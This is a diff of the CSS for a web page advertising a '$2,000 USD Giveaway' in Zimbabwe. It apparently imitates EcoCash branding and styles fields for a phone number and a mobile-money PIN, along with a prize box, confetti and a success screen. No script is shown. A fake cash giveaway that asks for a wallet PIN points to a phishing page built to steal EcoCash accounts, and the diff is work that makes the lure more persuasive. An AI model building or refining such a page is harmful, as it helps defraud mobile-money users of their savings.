@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>$2,000 USD EcoCash Giveaway • Zimbabwe</title>
+    <title>$2,000 USD Giveaway • Zimbabwe</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
     <style>
-        /* ─── RESET & BASE ─── */
-        *,
-        *::before,
-        *::after {
+        /* ─── RESET ─── */
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -21,222 +19,494 @@
             --gold: #f5b342;
             --gold-light: #ffd966;
             --gold-dark: #c78a2b;
-            --bg-dark: #0b0d12;
-            --bg-card: rgba(255, 255, 255, 0.04);
-            --text-primary: #f0edea;
-            --text-secondary: #a8a3a0;
-            --border-light: rgba(255, 255, 255, 0.08);
-            --shadow-glow: 0 0 60px rgba(245, 179, 66, 0.12);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
+            --glass-blur: 20px;
             --radius: 20px;
-            --transition: 0.4s cubic-bezier(0.22, 1, 0.36, 1);
-            --ecocash-green: #00a859;
-        }
-
-        html {
-            scroll-behavior: smooth;
-            height: 100%;
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--bg-dark);
-            color: var(--text-primary);
+            font-family: 'Inter', -apple-system, sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            background: #0a0c12;
+            color: #fff;
+            overflow: hidden;
             position: relative;
-            overflow-x: hidden;
-            background-image:
-                radial-gradient(ellipse at 30% 40%, rgba(245, 179, 66, 0.15) 0%, transparent 55%),
-                radial-gradient(ellipse at 70% 60%, rgba(245, 179, 66, 0.08) 0%, transparent 50%),
-                radial-gradient(ellipse at 50% 100%, rgba(245, 179, 66, 0.05) 0%, transparent 40%);
-            background-attachment: fixed;
         }
 
-        /* ─── FALLING DOLLARS BACKGROUND ─── */
-        #dollar-rain {
+        /* ─── VIDEO BACKGROUND ─── */
+        #video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: #0a0c12;
+            overflow: hidden;
+        }
+
+        #video-bg video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, transparent 30%, rgba(0, 0, 0, 0.75) 100%);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* ─── CROWD SCENE ─── */
+        .crowd-scene {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 30%;
+            z-index: 2;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .crowd {
+            display: flex;
+            align-items: flex-end;
+            justify-content: space-around;
+            height: 100%;
+            padding: 0 15px;
+            gap: 4px;
+        }
+
+        .person {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: bob 3s ease-in-out infinite;
+            opacity: 0.5;
+        }
+
+        .person:nth-child(odd) { animation-delay: 0.3s; opacity: 0.7; }
+        .person:nth-child(3n) { animation-delay: 0.7s; opacity: 0.6; }
+        .person:nth-child(5n+2) { animation-delay: 0.1s; opacity: 0.8; }
+
+        @keyframes bob {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
+        .head {
+            width: 18px;
+            height: 18px;
+            background: radial-gradient(ellipse at 40% 30%, rgba(60,60,70,0.8), rgba(20,20,25,0.9));
+            border-radius: 50%;
+            margin-bottom: -3px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .head .ring {
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid rgba(245, 179, 66, 0.25);
+            animation: ringPulse 1.8s ease-out infinite;
+            pointer-events: none;
+        }
+
+        .head .ring:nth-child(2) {
+            animation-delay: 0.6s;
+            border-color: rgba(74, 222, 128, 0.15);
+        }
+
+        @keyframes ringPulse {
+            0% { transform: scale(0.7); opacity: 1; }
+            100% { transform: scale(2); opacity: 0; }
+        }
+
+        .body {
+            width: 26px;
+            height: 32px;
+            background: radial-gradient(ellipse at 30% 30%, rgba(40,40,50,0.8), rgba(10,10,15,0.95));
+            border-radius: 8px 8px 4px 4px;
+            position: relative;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+
+        .phone {
+            position: absolute;
+            right: -12px;
+            top: 6px;
+            width: 20px;
+            height: 16px;
+            background: radial-gradient(ellipse at 30% 30%, rgba(50,50,60,0.7), rgba(20,20,25,0.8));
+            border-radius: 6px 6px 2px 2px;
+            animation: tap 2.2s ease-in-out infinite;
+        }
+
+        .phone::before {
+            content: '📱';
+            position: absolute;
+            top: -10px;
+            left: -2px;
+            font-size: 12px;
+            animation: glow 1.6s ease-in-out infinite;
+        }
+
+        @keyframes tap {
+            0%, 100% { transform: rotate(-8deg) translateY(0); }
+            30% { transform: rotate(-3deg) translateY(-4px); }
+            60% { transform: rotate(-12deg) translateY(2px); }
+        }
+
+        @keyframes glow {
+            0%, 100% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.1); filter: drop-shadow(0 0 10px rgba(245,179,66,0.4)); }
+        }
+
+        .person.excited .body {
+            animation: jump 1.2s ease-in-out infinite;
+        }
+
+        @keyframes jump {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-14px); }
+        }
+
+        .person.excited .phone {
+            animation: excitedTap 0.9s ease-in-out infinite;
+        }
+
+        @keyframes excitedTap {
+            0%, 100% { transform: rotate(-12deg) translateY(0); }
+            50% { transform: rotate(-3deg) translateY(-8px); }
+        }
+
+        /* Crowd confetti */
+        .crowd-confetti {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .crowd-confetti span {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            border-radius: 1px;
+            animation: confettiFall 4.5s linear infinite;
+            opacity: 0;
+        }
+
+        .crowd-confetti span:nth-child(1) { left: 8%; animation-delay: 0s; background: #f5b342; }
+        .crowd-confetti span:nth-child(2) { left: 18%; animation-delay: 1.4s; background: #4ade80; }
+        .crowd-confetti span:nth-child(3) { left: 28%; animation-delay: 0.6s; background: #f87171; }
+        .crowd-confetti span:nth-child(4) { left: 42%; animation-delay: 2.2s; background: #ffd966; }
+        .crowd-confetti span:nth-child(5) { left: 55%; animation-delay: 0.9s; background: #c084fc; }
+        .crowd-confetti span:nth-child(6) { left: 65%; animation-delay: 1.7s; background: #f472b6; }
+        .crowd-confetti span:nth-child(7) { left: 75%; animation-delay: 0.4s; background: #f5b342; }
+        .crowd-confetti span:nth-child(8) { left: 88%; animation-delay: 2s; background: #4ade80; }
+        .crowd-confetti span:nth-child(9) { left: 12%; animation-delay: 2.8s; background: #60a5fa; }
+        .crowd-confetti span:nth-child(10) { left: 48%; animation-delay: 0.8s; background: #f87171; }
+        .crowd-confetti span:nth-child(11) { left: 72%; animation-delay: 1.5s; background: #ffd966; }
+        .crowd-confetti span:nth-child(12) { left: 32%; animation-delay: 1s; background: #c084fc; }
+
+        @keyframes confettiFall {
+            0% { transform: translateY(-20px) rotate(0) scale(0); opacity: 0; }
+            15% { opacity: 0.8; transform: translateY(0) rotate(60deg) scale(1); }
+            85% { opacity: 0.8; }
+            100% { transform: translateY(80px) rotate(180deg) scale(0.4); opacity: 0; }
+        }
+
+        /* ─── FALLING DOLLARS ─── */
+        #dollars {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-            opacity: 0.4;
-        }
-        .dollar {
-            position: absolute;
-            top: -50px;
-            font-size: 18px;
-            font-weight: 600;
-            color: rgba(245, 179, 66, 0.25);
-            animation: fall linear infinite;
-            user-select: none;
-            will-change: transform;
-            text-shadow: 0 0 12px rgba(245, 179, 66, 0.15);
-        }
-        @keyframes fall {
-            0% {
-                transform: translateY(-50px) rotate(0deg) scale(0.8);
-                opacity: 0;
-            }
-            10% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(calc(100vh + 100px)) rotate(720deg) scale(1.2);
-                opacity: 0.2;
-            }
-        }
-
-        /* ─── SCROLLBAR ─── */
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg-dark);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--gold-dark);
-            border-radius: 10px;
-        }
-
-        /* ─── MAIN CARD ─── */
-        .card {
-            max-width: 500px;
-            width: 100%;
-            background: var(--bg-card);
-            backdrop-filter: blur(24px) saturate(1.4);
-            -webkit-backdrop-filter: blur(24px) saturate(1.4);
-            border: 1px solid var(--border-light);
-            border-radius: var(--radius);
-            padding: 40px 32px 36px;
-            box-shadow: var(--shadow-glow), 0 20px 60px rgba(0, 0, 0, 0.5);
-            position: relative;
             z-index: 1;
             overflow: hidden;
-            transition: var(--transition);
+            opacity: 0.08;
+        }
+
+        .dollar {
+            position: absolute;
+            top: -40px;
+            font-size: 20px;
+            animation: fall linear infinite;
+            user-select: none;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(0) rotate(0deg) scale(0.8); opacity: 0; }
+            10% { opacity: 1; }
+            100% { transform: translateY(calc(100vh + 100px)) rotate(720deg) scale(1.2); opacity: 0; }
+        }
+
+        /* ─── SCANLINES ─── */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+            pointer-events: none;
+            z-index: 3;
+            animation: scan 8s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+
+        /* ─── GLASS CARD ─── */
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: var(--glass-bg);
+            backdrop-filter: blur(var(--glass-blur)) saturate(1.5);
+            -webkit-backdrop-filter: blur(var(--glass-blur)) saturate(1.5);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius);
+            padding: 36px 28px 32px;
+            box-shadow: var(--glass-shadow), inset 0 1px 0 rgba(255,255,255,0.06);
+            position: relative;
+            z-index: 10;
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px) scale(0.96); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
 
         .card::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(245, 179, 66, 0.04) 0%, transparent 70%);
+            top: -60%;
+            left: -60%;
+            width: 220%;
+            height: 220%;
+            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.04) 0%, transparent 60%);
             pointer-events: none;
             z-index: 0;
+            animation: shimmer 10s ease-in-out infinite;
         }
 
-        .card>* {
-            position: relative;
-            z-index: 1;
+        @keyframes shimmer {
+            0%, 100% { transform: translate(-10%, -10%); }
+            50% { transform: translate(10%, 10%); }
         }
 
-        /* ─── HEADER / BADGE ─── */
+        .card > * { position: relative; z-index: 1; }
+
+        /* ─── BADGE ─── */
         .badge {
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            background: rgba(245, 179, 66, 0.13);
-            border: 1px solid rgba(245, 179, 66, 0.18);
-            border-radius: 100px;
-            padding: 6px 16px 6px 10px;
-            font-size: 11px;
+            background: rgba(245, 179, 66, 0.1);
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(245, 179, 66, 0.12);
+            border-radius: 50px;
+            padding: 5px 14px 5px 8px;
+            font-size: 10px;
             font-weight: 600;
-            letter-spacing: 0.3px;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
             color: var(--gold-light);
-            margin-bottom: 20px;
-        }
-        .badge .dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: #4ade80;
-            display: inline-block;
-            animation: pulse-dot 1.8s ease-in-out infinite;
-        }
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.5;
-                transform: scale(0.75);
-            }
+            margin-bottom: 16px;
         }
 
-        /* ─── TITLE & SUBTITLE ─── */
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #4ade80;
+            animation: pulse 1.8s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.7); }
+        }
+
+        /* ─── TITLE ─── */
         .title {
-            font-size: 32px;
+            font-size: 30px;
             font-weight: 800;
             line-height: 1.15;
             letter-spacing: -0.5px;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
-        .title .highlight {
+
+        .title .gold {
             background: linear-gradient(135deg, var(--gold-light), var(--gold));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-        .subtitle {
+
+        .sub-title {
             font-size: 15px;
-            color: var(--text-secondary);
-            line-height: 1.6;
-            margin-bottom: 28px;
-        }
-        .subtitle strong {
-            color: var(--text-primary);
+            color: var(--gold-light);
             font-weight: 600;
+            margin-bottom: 4px;
         }
 
-        /* ─── PRIZE DISPLAY ─── */
-        .prize-display {
-            background: rgba(245, 179, 66, 0.06);
-            border: 1px solid rgba(245, 179, 66, 0.12);
+        .desc {
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        /* ─── BOUNCING PRIZE BOX ─── */
+        .prize-box {
+            background: rgba(245, 179, 66, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(245, 179, 66, 0.08);
             border-radius: 14px;
-            padding: 18px 20px;
+            padding: 16px 18px;
             display: flex;
             align-items: center;
             gap: 14px;
-            margin-bottom: 28px;
-            transition: var(--transition);
+            margin-bottom: 24px;
+            transition: 0.3s;
+            animation: bouncePrize 2s ease-in-out infinite;
+            position: relative;
+            cursor: default;
         }
-        .prize-display .icon {
-            font-size: 32px;
+
+        .prize-box::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(ellipse at center, rgba(245, 179, 66, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: -1;
+            animation: glowPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes bouncePrize {
+            0%, 100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            }
+            15% {
+                transform: translateY(-8px) scale(1.02);
+                box-shadow: 0 8px 30px rgba(245, 179, 66, 0.15);
+            }
+            30% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            }
+            45% {
+                transform: translateY(-5px) scale(1.01);
+                box-shadow: 0 6px 25px rgba(245, 179, 66, 0.1);
+            }
+            60% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            }
+            80% {
+                transform: translateY(-3px) scale(1.005);
+                box-shadow: 0 5px 22px rgba(245, 179, 66, 0.08);
+            }
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
+        }
+
+        .prize-box:hover {
+            animation-play-state: paused;
+            border-color: rgba(245, 179, 66, 0.25);
+        }
+
+        .prize-box .icon {
+            font-size: 30px;
             line-height: 1;
-            flex-shrink: 0;
+            animation: iconBounce 2s ease-in-out infinite;
         }
-        .prize-display .info {
-            flex: 1;
+
+        @keyframes iconBounce {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            15% { transform: scale(1.1) rotate(-5deg); }
+            30% { transform: scale(1) rotate(0deg); }
+            45% { transform: scale(1.05) rotate(3deg); }
+            60% { transform: scale(1) rotate(0deg); }
         }
-        .prize-display .info .label {
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.6px;
-            color: var(--gold-light);
-            opacity: 0.8;
+
+        .prize-box .info { flex: 1; }
+        .prize-box .label { 
+            font-size: 11px; 
+            font-weight: 600; 
+            text-transform: uppercase; 
+            letter-spacing: 0.6px; 
+            color: var(--gold-light); 
+            opacity: 0.7;
         }
-        .prize-display .info .amount {
-            font-size: 26px;
+        
+        .prize-box .amount {
+            font-size: 28px;
             font-weight: 800;
             color: var(--gold);
-            letter-spacing: -0.3px;
+            display: inline-block;
+            animation: amountBounce 2s ease-in-out infinite;
+            text-shadow: 0 0 30px rgba(245, 179, 66, 0.1);
         }
-        .prize-display .info .amount span {
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--text-secondary);
+
+        @keyframes amountBounce {
+            0%, 100% { transform: scale(1); }
+            15% { transform: scale(1.05); }
+            30% { transform: scale(1); }
+            45% { transform: scale(1.03); }
+            60% { transform: scale(1); }
+        }
+
+        .prize-box .amount small { 
+            font-size: 16px; 
+            font-weight: 600; 
+            color: rgba(255,255,255,0.4);
+            animation: smallBounce 2s ease-in-out infinite;
+        }
+
+        @keyframes smallBounce {
+            0%, 100% { transform: scale(1); }
+            15% { transform: scale(0.95); }
+            45% { transform: scale(0.97); }
         }
 
         /* ─── WALLET BADGE ─── */
@@ -244,305 +514,263 @@
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            background: rgba(0, 168, 89, 0.15);
-            border: 1px solid rgba(0, 168, 89, 0.25);
-            border-radius: 30px;
-            padding: 4px 14px 4px 10px;
-            font-size: 12px;
+            background: rgba(0, 168, 89, 0.1);
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(0, 168, 89, 0.15);
+            border-radius: 50px;
+            padding: 3px 12px 3px 8px;
+            font-size: 11px;
             font-weight: 600;
             color: #4ade80;
-            margin-top: 6px;
-        }
-        .wallet-badge svg {
-            width: 16px;
-            height: 16px;
+            margin-top: 4px;
+            animation: walletPulse 2.5s ease-in-out infinite;
         }
 
-        /* ─── FORM ELEMENTS ─── */
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 6px;
-            color: var(--text-secondary);
-            letter-spacing: 0.2px;
-        }
-        .form-group label .required {
-            color: #f87171;
-            margin-left: 2px;
+        @keyframes walletPulse {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
         }
 
-        .form-control {
-            width: 100%;
-            padding: 14px 18px;
-            font-size: 16px;
-            font-family: inherit;
-            font-weight: 500;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1.5px solid rgba(255, 255, 255, 0.07);
-            border-radius: 12px;
-            color: var(--text-primary);
-            outline: none;
-            transition: var(--transition);
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        .form-control:focus {
-            border-color: var(--gold);
-            background: rgba(255, 255, 255, 0.07);
-            box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
-        }
-        .form-control::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-            font-weight: 400;
-        }
-        .form-control.error {
-            border-color: #f87171;
-            box-shadow: 0 0 0 4px rgba(248, 113, 113, 0.08);
-        }
+        .wallet-badge svg { width: 14px; height: 14px; }
 
-        .form-hint {
-            font-size: 12px;
-            color: var(--text-secondary);
-            margin-top: 6px;
-            opacity: 0.7;
-        }
-        .form-hint.error-text {
-            color: #f87171;
-            opacity: 1;
-        }
+        /* ─── FORM ─── */
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; color: rgba(255,255,255,0.5); margin-bottom: 5px; letter-spacing: 0.3px; }
+        .form-group label .req { color: #f87171; }
 
-        /* ─── PHONE WITH PREFIX ─── */
-        .phone-prefix-group {
+        .input-group {
             display: flex;
             align-items: center;
-            gap: 0;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1.5px solid rgba(255, 255, 255, 0.07);
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(8px);
+            border: 1.5px solid rgba(255,255,255,0.06);
             border-radius: 12px;
-            transition: var(--transition);
+            transition: 0.3s;
         }
-        .phone-prefix-group:focus-within {
+
+        .input-group:focus-within {
             border-color: var(--gold);
-            box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
-            background: rgba(255, 255, 255, 0.07);
+            background: rgba(255,255,255,0.05);
+            box-shadow: 0 0 0 4px rgba(245,179,66,0.05);
         }
-        .phone-prefix-group .prefix {
-            padding: 14px 0 14px 18px;
-            font-size: 16px;
+
+        .input-group .prefix {
+            padding: 12px 0 12px 16px;
+            font-size: 15px;
             font-weight: 600;
-            color: var(--text-secondary);
+            color: rgba(255,255,255,0.5);
             white-space: nowrap;
+        }
+
+        .input-group input {
+            flex: 1;
+            padding: 12px 16px 12px 6px;
+            font-size: 15px;
+            font-family: inherit;
+            font-weight: 500;
             background: transparent;
             border: none;
-            user-select: none;
-            opacity: 0.8;
+            color: #fff;
+            outline: none;
         }
-        .phone-prefix-group .form-control {
-            border: none !important;
-            border-radius: 0 12px 12px 0 !important;
-            background: transparent !important;
-            padding-left: 8px;
-            box-shadow: none !important;
+
+        .input-group input::placeholder { color: rgba(255,255,255,0.15); }
+
+        .input-group input.error {
+            border-color: #f87171;
         }
-        .phone-prefix-group .form-control:focus {
-            box-shadow: none !important;
+
+        .input-hint {
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+            margin-top: 5px;
+        }
+
+        .input-hint.error { color: #f87171; }
+
+        /* ─── PHONE NUMBER SPECIFIC FORMAT ─── */
+        .phone-input .prefix {
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .phone-input input {
+            font-family: 'Inter', monospace;
+            letter-spacing: 1px;
+        }
+
+        .phone-input input::placeholder {
+            letter-spacing: 0.5px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* ─── PIN WITH TOGGLE ─── */
+        .pin-wrap {
+            position: relative;
+        }
+
+        .pin-wrap .toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 6px;
+            color: rgba(255,255,255,0.4);
+            font-size: 16px;
+            cursor: pointer;
+            padding: 4px 7px;
+            transition: 0.3s;
+            line-height: 1;
+        }
+
+        .pin-wrap .toggle:hover {
+            opacity: 1;
+            background: rgba(255,255,255,0.08);
         }
 
         /* ─── ECOCASH LOGO ─── */
-        .ecocash-logo {
+        .ecocash {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
             background: linear-gradient(135deg, #00a859, #00c46a);
-            padding: 4px 14px 4px 10px;
-            border-radius: 30px;
+            padding: 3px 12px 3px 8px;
+            border-radius: 50px;
             color: #fff;
             font-weight: 700;
-            font-size: 14px;
-            letter-spacing: 0.3px;
-            box-shadow: 0 2px 12px rgba(0, 168, 89, 0.3);
-            margin-right: 6px;
-            vertical-align: middle;
-        }
-        .ecocash-logo svg {
-            width: 24px;
-            height: 24px;
-            flex-shrink: 0;
-        }
-        .ecocash-logo .logo-text {
-            font-family: 'Inter', sans-serif;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-        }
-        .ecocash-logo .logo-text span {
-            color: #f7b731;
+            font-size: 12px;
+            box-shadow: 0 2px 16px rgba(0,168,89,0.2);
+            margin-right: 4px;
         }
 
-        /* ─── PIN INPUT ─── */
-        .pin-wrapper {
-            position: relative;
-        }
-        .pin-wrapper .toggle-vis {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: var(--text-secondary);
-            font-size: 18px;
-            cursor: pointer;
-            padding: 4px;
-            opacity: 0.6;
-            transition: var(--transition);
-        }
-        .pin-wrapper .toggle-vis:hover {
-            opacity: 1;
-        }
+        .ecocash svg { width: 20px; height: 20px; }
+        .ecocash span { font-weight: 800; letter-spacing: 0.3px; }
+        .ecocash span em { color: #f7b731; font-style: normal; }
 
         /* ─── BUTTON ─── */
         .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
             width: 100%;
-            padding: 16px 20px;
-            font-size: 16px;
+            padding: 15px 20px;
+            font-size: 15px;
             font-weight: 700;
             font-family: inherit;
             border: none;
             border-radius: 12px;
             cursor: pointer;
-            transition: var(--transition);
+            transition: 0.3s;
             position: relative;
             overflow: hidden;
+            margin-top: 6px;
         }
+
         .btn-primary {
             background: linear-gradient(135deg, var(--gold), var(--gold-dark));
             color: #0b0d12;
-            box-shadow: 0 4px 20px rgba(245, 179, 66, 0.25);
-            margin-top: 8px;
+            box-shadow: 0 4px 24px rgba(245,179,66,0.2);
         }
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(245, 179, 66, 0.35);
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: 0.5s;
         }
-        .btn-primary:active:not(:disabled) {
-            transform: scale(0.97);
-        }
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
+
+        .btn-primary:hover:not(:disabled)::before { left: 100%; }
+        .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 6px 32px rgba(245,179,66,0.3); }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
         .btn .spinner {
             width: 20px;
             height: 20px;
-            border: 2.5px solid rgba(11, 13, 18, 0.15);
+            border: 2.5px solid rgba(11,13,18,0.15);
             border-top-color: #0b0d12;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            display: inline-block;
         }
 
-        /* ─── SUCCESS SCREEN ─── */
-        .success-screen {
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ─── SUCCESS ─── */
+        .success {
             display: none;
             text-align: center;
-            padding: 20px 0 8px;
+            padding: 16px 0 4px;
             animation: fadeUp 0.6s ease forwards;
         }
-        .success-screen.active {
-            display: block;
-        }
 
-        .success-screen .checkmark {
-            width: 80px;
-            height: 80px;
+        .success.active { display: block; }
+
+        .success .check {
+            width: 72px;
+            height: 72px;
             border-radius: 50%;
             background: linear-gradient(135deg, #4ade80, #22c55e);
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 40px;
+            margin: 0 auto 16px;
+            font-size: 34px;
             color: #0b0d12;
-            box-shadow: 0 8px 40px rgba(74, 222, 128, 0.25);
-            animation: popIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
-        }
-        @keyframes popIn {
-            0% {
-                transform: scale(0.5);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
+            box-shadow: 0 8px 32px rgba(74,222,128,0.2);
+            animation: pop 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
         }
 
-        .success-screen h2 {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 12px;
-        }
-        .success-screen p {
-            color: var(--text-secondary);
-            font-size: 16px;
-            line-height: 1.7;
-            max-width: 380px;
-            margin: 0 auto;
-        }
-        .success-screen p .highlight-text {
-            color: var(--gold-light);
-            font-weight: 600;
+        @keyframes pop {
+            0% { transform: scale(0.4); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
         }
 
-        /* ─── STATUS INDICATOR ─── */
-        .status-bar {
-            margin-top: 20px;
-            padding: 12px 16px;
+        .success h2 { font-size: 22px; font-weight: 800; margin-bottom: 8px; }
+        .success p { color: rgba(255,255,255,0.5); font-size: 14px; line-height: 1.7; max-width: 340px; margin: 0 auto; }
+        .success p .hl { color: var(--gold-light); font-weight: 600; }
+
+        /* ─── STATUS ─── */
+        .status {
+            margin-top: 16px;
+            padding: 10px 14px;
             border-radius: 12px;
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
             display: none;
             align-items: center;
-            gap: 12px;
-            font-size: 14px;
-            color: var(--text-secondary);
+            gap: 10px;
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
         }
-        .status-bar.active {
-            display: flex;
-        }
-        .status-bar .status-dot {
-            width: 10px;
-            height: 10px;
+
+        .status.active { display: flex; }
+        .status .dot {
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
-            flex-shrink: 0;
             background: var(--gold);
-            animation: pulse-dot 1.5s ease-in-out infinite;
+            animation: pulse 1.5s ease-in-out infinite;
+            flex-shrink: 0;
         }
-        .status-bar .status-dot.success {
-            background: #4ade80;
-            animation: none;
-        }
-        .status-bar .status-dot.error {
-            background: #f87171;
-            animation: none;
+        .status .dot.success { background: #4ade80; animation: none; }
